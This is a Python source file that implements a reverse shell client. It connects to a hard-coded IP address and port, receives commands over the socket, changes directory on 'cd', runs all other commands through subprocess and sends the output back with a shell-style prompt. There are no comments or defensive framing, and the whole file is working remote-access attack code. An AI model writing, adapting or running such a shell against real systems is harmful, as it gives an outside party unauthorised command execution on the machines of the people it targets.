import socket
import os
import subprocess

def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        print("Connection Established.")
        print(f"Address: {address}")
    except socket.error as error:
        print("Something went wrong... more info below.")
        print(error)
        exit()
    receiver(s)

def receiver(s):
    while True:
        cmd_bytes = s.recv(1024)
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, capture_output=True)
            data = p.stdout + p.stderr
            s.send(data + b"$: ")
    

if __name__ == "__main__":
    host = '192.168.100.17'
    port = 19876
    connect((host, port))